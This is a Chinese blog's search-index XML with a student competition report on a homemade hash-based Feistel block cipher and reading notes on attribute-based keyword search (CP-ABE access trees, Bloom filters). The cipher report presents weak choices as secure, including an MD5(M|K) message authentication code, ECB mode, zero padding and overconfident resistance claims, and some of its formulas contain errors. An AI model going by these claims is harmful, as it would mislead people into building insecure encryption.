<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>关于论文《Privacy-Preserving Multi-Keyword Searchable Encryption for Distributed Systems》的一些想法</title>
      <link href="/2021/10/26/%E5%85%B3%E4%BA%8E%E8%AE%BA%E6%96%87%E3%80%8APrivacy-Preserving-Multi-Keyword-Searchable-Encryption-for-Distributed-Systems%E3%80%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95/"/>
      <url>/2021/10/26/%E5%85%B3%E4%BA%8E%E8%AE%BA%E6%96%87%E3%80%8APrivacy-Preserving-Multi-Keyword-Searchable-Encryption-for-Distributed-Systems%E3%80%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>巴拉巴拉</p><p>如题，之后再更。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 小白，学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于hash算法的分组数据加密软件——作品设计报告</title>
      <link href="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/"/>
      <url>/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="1-作品功能与性能说明"><a href="#1-作品功能与性能说明" class="headerlink" title="1.作品功能与性能说明"></a>1.作品功能与性能说明</h1><p>本作品设计了一个基于哈希算法的分组加密系统，软件页面如图1.1所示。软件使用三轮非平衡Feistel结构，调用成熟的哈希算法作为轮函数（在轮函数是密码安全的伪随机函数时，3轮Feistel就足以使这种分组密码成为伪随机置换），完成密钥、分组长度、Feistel结构左右分块大小、使用的哈希算法、分组密码的工作模式、输入/输出格式均可由使用者灵活控制的加密系统。作品功能与性能说明如下所述。</p><img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image1.png" align="center"><div align="center">图1.1 软件设计页面</div><h2 id="1-1-作品功能"><a href="#1-1-作品功能" class="headerlink" title="1.1 作品功能"></a>1.1 作品功能</h2><ul><li><p><strong>支持多种哈希算法调用</strong></p><p>作品支持调用SM3、MD5、SHA-1、SHA-224、SHA-256、SHA-384、SHA-512、SHA3-224、SHA3-256、SHA3-384、SHA3-512、RIPEMD160等常见且成熟的哈希算法。</p></li><li><p><strong>支持多种分组长度和左右分块方案</strong></p><p>传统的分组加密例如DES，使用了固定的64比特分组长度且左右分块大小相等，而本作品的分组长度可控，支持使用者自定义分组长度和左右分块大小，例如自定义100比特的分组长度，30比特左分块和70比特右分块。</p></li><li><p><strong>支持多种分组密码工作模式选择</strong></p><p>作品支持使用者选择ECB、CBC、CFB、OFB等四种分组密码工作模式进行加解密操作。</p></li><li><p><strong>口令字作密钥</strong></p><p>密钥不使用传统的子密钥生成算法，而是由使用者自己输入的口令确定。即作品支持使用者自定义口令，并将口令作为Feistel网络中轮函数的部分输入，该口令即为本加密系统的密钥。</p></li><li><p><strong>密文拥有消息认证码，用作完整性检验与明密识别</strong></p><p>密文结果包含消息认证码，通过验证消息认证码，可以检验消息的完整性，同时实现明密识别。</p></li><li><p><strong>支持多种输入/输出格式</strong></p><p>密钥与加密数据的支持格式均包含中文字符；作品支持二进制、十进制、十六进制以及Base64等多种格式的输入和输出。</p></li></ul><h2 id="1-2-性能说明"><a href="#1-2-性能说明" class="headerlink" title="1.2 性能说明"></a>1.2 性能说明</h2><p>本作品调用哈希算法替代Feistel结构中的轮函数，通过与其他对称加密方案诸如AES、DES和3DES等进行比较（详见3.2节），表明本作品在加解密效率上有一定的实用性，同时满足了密钥长度、密钥内容、分组大小和加密模式等均可控的性能需求，有很强的灵活性与适用性。</p><h1 id="2-设计与实现方案"><a href="#2-设计与实现方案" class="headerlink" title="2.设计与实现方案"></a>2.设计与实现方案</h1><h2 id="2-1-设计原理"><a href="#2-1-设计原理" class="headerlink" title="2.1 设计原理"></a>2.1 设计原理</h2><p>本节详细描述系统的分组和填充方式，以及Feistel网络结构设计。</p><h3 id="2-1-1-分组和填充"><a href="#2-1-1-分组和填充" class="headerlink" title="2.1.1 分组和填充"></a>2.1.1 分组和填充</h3><p>加密阶段，首先将输入的明文转换为二进制串，根据设定的分组大小进行分割，若明文长度不能整除分组大小，则在明文二进制串末尾填充‘0’直至能刚好分割为若干个等长的分组；同时在填充完的数据末尾增加一个分组用于记录明文原始数据的长度，如图2.1所示。</p><img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image2.png" align="center"><div align="center">图2.1 明文的分组和填充</div><h3 id="2-1-2-Feistel网络结构设计"><a href="#2-1-2-Feistel网络结构设计" class="headerlink" title="2.1.2  Feistel网络结构设计"></a>2.1.2  Feistel网络结构设计</h3><p>本系统使用了三轮Feistel结构，每个明文分组作为Feistel网络的输入，根据使用者自定义的左右分块大小分为长度为a的左分块 L<sub>0</sub>和长度为b的右分块R<sub>0</sub>。</p><p>第一轮， L<sub>1</sub>=R<sub>0</sub>，R<sub>1</sub>=L<sub>0</sub> $\oplus$ Hash(K|R<sub>0</sub>)，Hash(K|R<sub>0</sub>)为口令K和R<sub>0</sub>拼接后进行哈希的结果，取前a个比特与L<sub>0</sub>异或得到R<sub>1</sub>；第二轮，L<sub>2</sub>=R<sub>2</sub>，R<sub>2</sub>=L<sub>1</sub>⊕Hash(K|R<sub>1</sub>)，Hash(K|R<sub>1</sub>)为口令K和R<sub>1</sub>拼接后进行哈希的结果，取前b个比特与L<sub>1</sub>异或；第三轮同第一轮相同；最后将L<sub>3</sub>|R<sub>3</sub>作为密文输出。</p><p>Feistel网络结构设计如图2.2所示。</p><img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image3.png" align="center"><div align="center">图2.2 Feistel网络结构</div><h3 id="2-1-3-密文及消息验证码"><a href="#2-1-3-密文及消息验证码" class="headerlink" title="2.1.3 密文及消息验证码"></a>2.1.3 密文及消息验证码</h3><p>将每个分组的密文输出拼接起来就是原始密文C’，其中记录长度的分组也会经过加密成为第n+1个分组，最后将明文M和口令K拼接后进行MD5哈希运算,即  ，得到的128比特结果即为消息验证码，将其拼接到原始密文C’后面形成最终的密文C。（若为CBC、CFB、OFB模式，则还会在密文前拼接一个x比特长的初始向量IV）。</p><h2 id="2-2-系统流程"><a href="#2-2-系统流程" class="headerlink" title="2.2 系统流程"></a>2.2 系统流程</h2><p> 本节描述系统的使用流程和运行流程。</p><h3 id="2-2-1-系统使用流程"><a href="#2-2-1-系统使用流程" class="headerlink" title="2.2.1 系统使用流程"></a>2.2.1 系统使用流程</h3><p>第一步☛：输入参数</p><p>系统需要接收使用者输入的八个参数：口令、文本、分组长度、左分块大小、右分块大小、哈希算法、工作模式、输入/输出格式。用户使用过程的流程如图2.3所示。</p><p>​    <img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image4.png" align="center"></p><div align="center">图2.3 用户使用流程图</div><p>第二步☛：输入检查</p><p>系统会对以下几项内容进行输入检查：</p><p><strong>①</strong> 确定每个参数都不为空且左右分块长度之和与分组长度相等；</p><p><strong>②</strong> 左右分块大小不得大于所选哈希算法的输出长度（这是因为在Feistel结果中，计算R<sub>1</sub>=L<sub>0</sub>⊕Hash(K|R<sub>0</sub>)时，若L<sub>0</sub>的长度大于Hash输出长度的话，就无法进行异或操作）；</p><p><strong>③</strong>当选择加密时，假设分组长度为n比特，则明文长度不得大于{2<sup>n</sup>-1}（这是因为我们使用了单独的一个分组来记录原始明文数据的长度，而一个n比特分组可表示的最大值为{2<sup>n</sup>-1}，因此原始明文数据不可以超过这个长度）；</p><p><strong>④</strong>当选择解密时，会首先检查消息验证码的正确性，只有验证码正确才能正常解密；</p><p><strong>⑤</strong>输入/输出格式检查</p><p>当选择加密时，无需检查此项，使用者可以自由选择密文的输出格式；当选择解密时，则需要检查输入格式，只有输入文本的格式与所选的格式对应才能解密成功。</p><h3 id="2-2-2-系统运行流程"><a href="#2-2-2-系统运行流程" class="headerlink" title="2.2.2 系统运行流程"></a>2.2.2 系统运行流程</h3><p>系统首先获取面板的基础输入，接着根据使用者选择的加密或解密操作，若选择加密，则首先检查明文长度是否过长，若检查通过则进行加密操作并添加消息验证码，得到最终的密文结果；若选择解密，则首先检查消息验证码的合法性，若检查通过，则舍弃消息验证码后进行解密，得到最终的明文结果。系统运行流程如图2.4所示。</p><img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image5.png" align="center"><div align="center">图2.4系统运行流程图</div><h2 id="2-3运行结果"><a href="#2-3运行结果" class="headerlink" title="2.3运行结果"></a>2.3运行结果</h2><p>本节展示系统的运行结果，包括加密、解密以及异常情况提示。</p><h3 id="2-3-1-加解密运行结果"><a href="#2-3-1-加解密运行结果" class="headerlink" title="2.3.1 加解密运行结果"></a>2.3.1 加解密运行结果</h3><p>​      对于加密，系统支持对中英文混合字符加密，且可以选择多种格式输出。例如对于某个中英文混合加密数据，选择以十六进制格式输出如图2.5所示，以Base64格式输出如图2.6所示。</p><img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image6.png" align="center"><div align="center">图2.5 十六进制格式输出</div>          <img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image7.png" align="center"><div align="center">图2.6 base64格式输出</div> <p>   对于解密，系统支持对不同格式的密文进行解密，例如对十六进制格式密文解密结果如图2.7所示，对Base64格式密文解密结果如图2.8所示。</p><img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image8.png" align="center">   <div align="center">图2.7 十六进制格式输出</div>          <img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image9.png" align="center"><div align="center">图2.8 base64格式输出</div><h3 id="2-3-2-异常情况判断"><a href="#2-3-2-异常情况判断" class="headerlink" title="2.3.2 异常情况判断"></a>2.3.2 异常情况判断</h3><p>下面给出系统的异常情况判断。</p><p>   <strong>①完整性检验未通过</strong>；   当密文的消息验证码发生错误时，报错如图2.9所示；</p><img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image10.png" align="center"><div align="center">图2.9 完整性检验未通过</div>     <p>   <strong>②分块大小与左右分块和不一致</strong>；例如BlockSize选择100，LeftSize选择40和55，报错如图2.10所示；</p><img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image11.png" align="center"><div align="center">图2.10 分块大小与左右分块和不一致</div><p>   <strong>③明文过长或为空</strong>；如图2.11(1)和图2.11(2)所示；</p><img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image12.png" align="center"><div align="center">图2.11(1) 明文过长</div>           <img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image13.png" align="center"><div align="center">图2.11(2) 明文为空 </div><p>   <strong>④分组长度、左分块、右分块中存在0；</strong>如图2.12所示；</p><img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image14.png" align="center"><div align="center">图2.12 分组长度、左分块、右分块中存在0 </div><p>   <strong>⑤口令为空；</strong>如图2.13所示；</p><img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image15.png" align="center"><div align="center">图2.13 口令为空</div><p>​      <strong>⑥密钥、加密模式、编码或哈希算法不匹配；</strong>如图2.14(1)和图2.14(2)所示；</p><img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image16.png" align="center"><div align="center">图2.14(1)解密错误</div><img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image17.png" align="center"><div align="center">图2.14(2) 编码格式错误</div><h1 id="3-系统测试与结果"><a href="#3-系统测试与结果" class="headerlink" title="3.系统测试与结果"></a>3.系统测试与结果</h1><p>系统测试从功能测试和性能测试两方面进行。</p><p>在功能测试方面，我们对软件进行功能需求分析，然后对于所有功能需求都给出样例并运行至成功。对可能出现异常的操作进行排查，用样例抛出结果。</p><p>在性能测试方面，我们将本方案hashBlockCipher在加解密效率、空间性能和安全性能上与AES、DES、DES3和SHA1进行了比较 。</p><h2 id="3-1-功能测试"><a href="#3-1-功能测试" class="headerlink" title="3.1 功能测试"></a>3.1 功能测试</h2><p>通过第二节中的系统实现流程，可以看到我们的系统支持SM3、MD5、SHA-1、SHA-2和SHA-3等常见hash算法调用；支持多种分组长度和左右块分块方案；支持ECB、CBC、CFB、OFB等分组密码工作模式的选择；口令字作密钥，密数据中有明密识别和消息认证标志，有完整性检验；支持中英文字符混合加解密；密文支持二进制、十进制、十六进制和Base64等格式输出和输入。</p><h2 id="3-2-性能测试"><a href="#3-2-性能测试" class="headerlink" title="3.2 性能测试"></a>3.2 性能测试</h2><p>  我们从加解密效率和密钥存储空间对我们的系统进行了性能测试。</p><p>◆加解密效率对比（加密一百万次的时间对比，单位：秒）</p><p>通过对比AES、DES、3-DES、以及本作品的加密时间来对比加解密效率，通过控制变量，即四个方案的明文输入都恰好为一个分组，同时本次实验的左右分块大小都设置为各自占一半，以排除其他的影响因素进行实验，同时由于在本次对照实验中的Feistel网络使用了SHA-1哈希算法，因此我们单独将SHA-1哈希的时间分离开来计算，结果如图2.15所示。</p> <img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image18.png" align="center"><div align="center">图2.15 加密效率对比</div><p>可以看到：</p><p><strong>AES</strong>：10.221512794494629s </p><p><strong>DES</strong>：11.831102132797241s</p><p><strong>3-DES</strong>：37.54402709007263s </p><p><strong>本作品</strong>：22.443878650665283s</p><p><strong>SHA-1</strong>：4.437442779541016s</p><p>我们的方案耗时大于AES和DES，但小于3-DES。由于我们使用的轮函数为哈希算法，为了更直观的对比哈希算法所占用的时间，我们将本次实验中所使用的SHA-1单独分离出来计算一百万次。由于我们的方案每次加密会调用三次哈希算法，因此若将本方案扣除三次哈希所占用的时间，效率上与AES和DES相差无几。</p><p>我们通过牺牲一定的时间效率来换取加密方案的灵活性，实现了传统分组密码不具备的功能。</p><p>◆空间性能对比（比较各自密钥大小）</p><p>与常见的分组密码相比，例如AES的密钥长度为<strong>128</strong>、<strong>192</strong>或<strong>256</strong>比特，DES的密钥长度为<strong>64</strong>比特，三重DES的密钥长度为<strong>112</strong>比特，本作品的密钥长度完全由用户自定义，即可使用较短的密钥以减少存储空间，也可以适当增长密钥以提升安全性能。</p><h2 id="3-3-测试数据与结果"><a href="#3-3-测试数据与结果" class="headerlink" title="3.3 测试数据与结果"></a>3.3 测试数据与结果</h2><p>我们的测试样例如下所示<strong>：</strong></p><p><code>&#123;&quot;blockSize&quot;: 100,</code></p><p><code>&quot;leftSize&quot;: 30,</code></p><p><code>&quot;rightSize&quot;: 70,</code> </p><p><code>&quot;plainText&quot;: &quot;This is a test. Test whether the encrypt system is safe or not.&quot;,</code> </p><p><code>&quot;key&quot;: &quot;I am a key!&quot;,</code> </p><p><code>&quot;哈希算法&quot;: sm3/sha1/sha2_224/sha2_256/sha2_384/sha2_512/sha2_224/sha2_256/sha2_384/sha2_512,</code></p><p><code>&quot;加密模式&quot;: ecb/cbc/cfb/ofb,</code> </p><p><code>密文输出格式/密文输入格式: Binary/Decimal/Hexadecimal/Base64&#125;</code></p><h1 id="4-应用前景"><a href="#4-应用前景" class="headerlink" title="4.应用前景"></a>4.应用前景</h1><p>本作品在传统分组加密方案的基础上增加了更多的灵活性，进一步迎合了用户的需求；并可以通过大幅提高密钥长度来增强加密方案的安全性；同时用哈希函数替换轮函数使得一些针对分组加密的攻击诸如CBC翻转攻击和padding oracle等变得十分困难。因此本作品拥有加密软件所需的一定的安全性能，也满足了用户的使用体验，有很良好的应用前景。</p><h1 id="5-结论"><a href="#5-结论" class="headerlink" title="5. 结论"></a>5. 结论</h1><p>本作品的特点为灵活度高，与传统的分组密码不同，本作品支持自定义分组长度以及Feistel网络的左右分块大小，同时使用用户的口令作为加密系统的密钥，整个系统完全受用户所控。在加密效率上，本作品使用的是分组加密模式，采用单密钥加密，因此加解密效率较高，适用性很强；在安全性上，由于Feistel轮函数使用的是成熟的哈希算法，在轮函数是密码安全的伪随机函数时，3轮Feistel就足以使这种分组密码成为伪随机置换；同时hash算法作为轮函数，使得密钥长度完全受用户控制，使用较长密钥能够获得更高的安全性，密文破解会很困难。本作品相较于AES、DES和3DES等传统的对称加密方案有许多改进之处，实现了传统分组密码不具备的功能。</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 哈希 </tag>
            
            <tag> 分组密码 </tag>
            
            <tag> Feistel结构 </tag>
            
            <tag> 可控分组长度 </tag>
            
            <tag> 加密系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VABKS: Verifiable Attribute-based Keyword Search over Outsourced Encrypted Data——论文研读</title>
      <link href="/2021/10/22/VABKS-Verifiable-Attribute-based-Keyword-Search-over-Outsourced-Encrypted-Data%E2%80%94%E2%80%94%E8%AE%BA%E6%96%87%E7%A0%94%E8%AF%BB/"/>
      <url>/2021/10/22/VABKS-Verifiable-Attribute-based-Keyword-Search-over-Outsourced-Encrypted-Data%E2%80%94%E2%80%94%E8%AE%BA%E6%96%87%E7%A0%94%E8%AF%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="论文汇报"><a href="#论文汇报" class="headerlink" title="论文汇报"></a>论文汇报</h1><p>上周我主要是在看《VABKS: Verifiable Attribute-based Keyword Search over Outsourced Encrypted Data》，里面用到访问控制结构和布隆过滤器，我整理如下：</p><h2 id="密文策略基于属性加密-CP-ABE-访问树构造与解密"><a href="#密文策略基于属性加密-CP-ABE-访问树构造与解密" class="headerlink" title="密文策略基于属性加密(CP-ABE)访问树构造与解密"></a>密文策略基于属性加密(CP-ABE)访问树构造与解密</h2><h3 id="构造访问树"><a href="#构造访问树" class="headerlink" title="构造访问树"></a>构造访问树</h3><p>在CP-ABE方案中，访问树用于隐藏源数据的加密密钥，其形状结构如其名一样，是一棵树。其叶子节点为数据所有者设定的属性和属性值以及父节点传于此节点的秘密值，并对其加密处理，只有数据访问者拥有此属性方可解密出此节点的秘密值；非叶子节点为门限节点，数据访问者需满足此门限最低值方可解密此节点秘密值，例如门限为3/5，此节点有5个子节点，数据访问者需至少满足3个子节点才能解密出秘密值。</p><p>构造的访问树如下图，能访问此访问树加密的元数据，数据访问者需要满足的属性是：</p><ul><li><p>(“计算机学院” 且 “硕士” 且 “研二”)和 “教师”</p></li><li><p>“教师” 和(“网络实验室” 或 “云实验室”)</p></li><li><p>(“计算机学院” 且 “硕士” 且 “研二”)和(“网络实验室” 或 “云实验室”)</p><p><img src="/2021/10/22/VABKS-Verifiable-Attribute-based-Keyword-Search-over-Outsourced-Encrypted-Data%E2%80%94%E2%80%94%E8%AE%BA%E6%96%87%E7%A0%94%E8%AF%BB/image1.png" alt="image1"></p><p>从根节点开始，其门限是2，孩子节点有3个，即需要有至少2个孩子节点才能得到源数据值；根节点随机生成一个多项式，其最高次数为门限值少1，故根节点的最高次数为1，然后将常数项设置为秘密数；比如此根节点随机的多项式为f(x)=5+3x，秘密数为5.此外将根节点的孩子节点从左往右依次标记为1,2,3,…….,将节点标记值带入f(x)函数中，所得值（即生成新的秘密值）传给该标记的的孩子节点秘密保存；故“3/3”节点标记为1，传给“3/3”节点的秘密值f(1)=5+31=8,中间“教师”节点标记为2，传给“教师”节点的秘密值f(2)=5+32=11,”1/2”节点标记为3，传给“1/2”节点的秘密值为f(3)=5+3*3=14。</p><p>“3/3”节点和“1/2”节点在接收到父节点传来的值后，按照上述方式生成随机多项式，将常数项设置为父节点传来的值，此外也按照上述方式生成新的秘密值并将它传给子节点；对于叶子节点，在接受到父节点的秘密值后，用此叶子节点的属性对秘密值进行加密处理。</p><h3 id="从访问树中解密出访问树的秘密数"><a href="#从访问树中解密出访问树的秘密数" class="headerlink" title="从访问树中解密出访问树的秘密数"></a>从访问树中解密出访问树的秘密数</h3><p>数据访问者需满足访问树方可解密出访问树的秘密值，对于上述访问树，数据访问者需满足以下属性集中的一个：（计算机学院、硕士、研二、教师）、（计算机学院、硕士、研二、网络实验室）、（计算机学院、硕士、研二、云实验室）、（教师、网络实验室）、（教师、云实验室）。若上述属性集中某一个或多个（至少一个）为数据访问者属性集的子集，则能解密出秘密值，下面开始解密处理。<br>对于叶子节点，在数据访问者属性集中寻找出和此节点属性与属性值一致的属性，用找出的属性解密出此节点的秘密值（即公式1），当然不能完全解密出，他是秘密值和加密时对此属性设置的加密值的乘积。</p><p>解密出叶子节点后，开始解密其父节点（非叶子节点），在解密出叶子节点后，即可得到多对值；如在上述访问树的“3/3”节点，其孩子节点解密出三个值19，44，83（推理过程忽略随机数），在生成这三个数时，f(1)=19，f(2)=44，f(3)=83，其中f(x)=8+4x+7x<sup>2</sup>（解密时并不知道此多项式，只知道后面的三个点），因此在f(x)上有三个点是（1，19），（2，44），（3，83）；因为此节点存储的秘密值是多项式的常数项，即f(0)=秘密值，故我们需要根据这三个点得到0所对应的值是多少，根据拉格朗日公式就能求出0所对应的值，即解密出秘密值（即公式2）；对于非叶子节点均可按照上述方式解密出秘密值，在根节点处解密出整个树所隐藏的秘密值（是秘密值和加密时对此属性设置的加密值的乘积，所有节点解密出的秘密都存在一个随机数，解密出的值都是随机数和秘密值的乘积，只是讲述过程中为了方便忽略了随机数，最后根节点解密出的随机数在最后的解密过程中会抵消掉（公式3））。</p><p>另外需要说明的是“3/3”节点是一个3个孩子节点、门限值为3的节点，相当于且关系，数据访问者需解密出所有的孩子节点方可用拉格朗日公式解密出常数项（即秘密值）；“1/2”节点是一个2个孩子节点、门限值为1的节点，故为或关系，数据访问者只满足其中一个孩子节点即可解密出秘密值（秘密值就是孩子节点解密出的秘密值，因为根据随机多项式生成规则，多项式的最高次数为门限值少1，门限值为1，故最高次数为0，即常数项）；若如“2/3”这样的节点，既非且关系，也非或关系，3个孩子节点，门限值为2，若需解密出此节点的秘密值，数据访问者需解密出三个孩子节点中的两个节点即可解密出孩子节点。</p><h2 id="布隆过滤器"><a href="#布隆过滤器" class="headerlink" title="布隆过滤器"></a>布隆过滤器</h2><p>当一个元素被加入集合时，通过多个哈希函数将元素映射到一个比特数组中的若干个位置，并把它们置为 1 ，查询时，只要看看这些位置是不是都是 1 就知道元素是否（可能）在集合中了：如果这些位置中有任意一个是 0，那么此元素一定不在集合中；如果都是 1，那么此元素可能在集合中，注意是「可能」在，也就是说「可能」不在，这被称作False positive。</p><p>如下图所示，字符串”Hello”被哈希函数映射到比特数组中索引为1和3的位置，布隆过滤器就会把这些位置置为1；</p><p><img src="/2021/10/22/VABKS-Verifiable-Attribute-based-Keyword-Search-over-Outsourced-Encrypted-Data%E2%80%94%E2%80%94%E8%AE%BA%E6%96%87%E7%A0%94%E8%AF%BB/image2.png" alt="image2"></p><p>然后接着在将字符串”Bloom”映射上来，如下图所示，字符串”Bloom”被哈希函数映射到比特数组中索引为1和2的位置，布隆过滤器也会把这些位置置为1.这样的话字符串”Hello”和”Bloom”映射的位置发生了”冲突”，索引为1的位置都为1了，这个问题不大，因为布隆过滤器使用的是多个哈希函数，查询的时候必须所有的哈希函数映射的索引位置都为1才行。</p><p><img src="/2021/10/22/VABKS-Verifiable-Attribute-based-Keyword-Search-over-Outsourced-Encrypted-Data%E2%80%94%E2%80%94%E8%AE%BA%E6%96%87%E7%A0%94%E8%AF%BB/image3.png" 